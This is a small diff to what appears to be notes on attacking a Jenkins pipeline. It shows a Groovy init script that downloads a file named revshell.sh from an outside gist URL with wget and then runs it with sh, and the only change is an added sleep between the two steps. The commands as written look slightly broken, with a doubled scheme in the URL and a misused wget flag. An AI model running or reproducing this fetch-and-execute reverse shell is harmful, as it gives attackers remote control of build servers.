@@ -72,6 +72,7 @@ pipeline{
 init.groovy
 ```
 "wget -o /tmp/revshell.sh  http://https://gist.githubusercontent.com/dibsy/temp-cmd.txt".execute()
+sleep(5000)
 "sh /tmp/revshell.sh".execute()
 ```
 revshell.sh
